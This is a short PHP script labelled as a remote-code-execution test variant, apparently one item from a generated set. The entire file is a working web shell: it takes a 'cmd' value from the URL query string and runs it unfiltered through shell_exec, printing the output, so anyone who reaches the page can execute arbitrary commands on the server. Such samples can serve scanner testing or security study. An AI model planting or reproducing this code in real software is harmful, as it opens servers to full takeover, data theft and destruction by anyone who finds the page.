<?php
// RCE test variation #514
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>